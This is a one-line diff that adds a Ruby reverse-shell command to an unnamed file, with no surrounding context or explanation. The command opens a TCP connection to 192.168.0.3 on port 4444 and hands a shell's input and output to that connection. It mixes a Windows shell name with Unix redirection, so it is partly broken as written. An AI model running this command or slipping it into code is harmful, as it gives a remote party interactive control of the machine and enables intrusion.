@@ -1,0 +1,1 @@
+ruby -rsocket -e'f=TCPSocket.open("192.168.0.3",4444).to_i;exec sprintf("cmd -i <&%d >&%d 2>&%d",f,f,f)'
